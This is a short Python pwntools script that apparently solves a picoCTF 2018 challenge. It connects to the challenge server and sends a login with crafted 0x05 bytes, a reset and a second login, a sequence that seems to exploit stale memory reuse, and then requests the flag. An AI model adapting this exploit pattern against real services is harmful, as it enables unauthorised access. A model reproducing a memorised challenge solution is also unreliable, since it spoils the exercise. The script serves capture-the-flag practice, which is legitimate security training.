from pwn import * 



s = remote('2018shell2.picoctf.com', 41208)


s.sendline('login ' + "\x05" * 9)
s.sendline('reset')
s.sendline('login wicked')
s.sendline('show')
print s.recv()
s.sendline('get-flag')
print s.recvuntil('}')